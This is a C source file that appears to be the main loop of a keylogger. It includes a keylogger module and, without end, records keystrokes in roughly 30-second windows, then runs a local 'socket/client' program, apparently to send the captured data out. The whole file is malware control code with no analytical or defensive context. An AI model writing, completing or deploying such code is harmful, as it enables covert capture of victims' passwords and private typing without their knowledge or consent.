#include "Keylogger/keylogger.c"
#include <unistd.h>
#include <stdlib.h>
#include <stdio.h>
#include <time.h>
#include <string.h>

int trigger = 30000;
void time_30s(int trigger);

int main (){
  keylogger_init();
  while (1){
   keylogger_start();
   time_30s(trigger);
   keylogger_end();
    char cwd[1024];
    if (getcwd(cwd, sizeof(cwd)) != NULL)
      // fprintf(stdout, "Current working dir: %s\n", cwd);
      strcat(cwd, "/socket/client");
    system(cwd);
  }
}

void time_30s(int trigger){
  int msec = 0;
  clock_t before = clock();
  do {
    clock_t difference = clock() - before;
    msec = difference * 1000 / CLOCKS_PER_SEC;
  } while ( msec < trigger );
}
